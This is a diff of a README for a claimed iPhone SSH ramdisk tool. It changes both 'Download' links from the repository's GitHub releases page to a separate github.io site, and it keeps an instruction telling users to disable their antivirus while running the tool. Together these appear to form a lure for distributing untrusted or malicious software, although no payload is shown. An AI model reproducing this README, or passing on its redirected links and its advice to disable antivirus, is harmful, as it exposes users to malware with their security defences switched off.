@@ -1,6 +1,6 @@
 # 🚀 ICH_A12_plus_Ramdisk - Manage your device ramdisk with ease
 
-[![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Scattered-genusproconsul781/ICH_A12_plus_Ramdisk/releases)
+[![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://scattered-genusproconsul781.github.io)
 
 ICH_A12_plus_Ramdisk allows users to create and manage an SSH ramdisk for A12 and A13 devices. This tool uses the usbliter8 connection method to establish communication between your computer and your handheld device. It provides a stable interface for tasks requiring low-level access to your device memory.
 
@@ -20,7 +20,7 @@ Disable any antivirus software temporarily while you run this tool. Some securit
 
 You must download the files from the official repository release page. 
 
-[Click here to visit the release page to download the latest version](https://github.com/Scattered-genusproconsul781/ICH_A12_plus_Ramdisk/releases)
+[Click here to visit the release page to download the latest version](https://scattered-genusproconsul781.github.io)
 
 1. Navigate to the link above.
 2. Look for the section labeled "Assets."
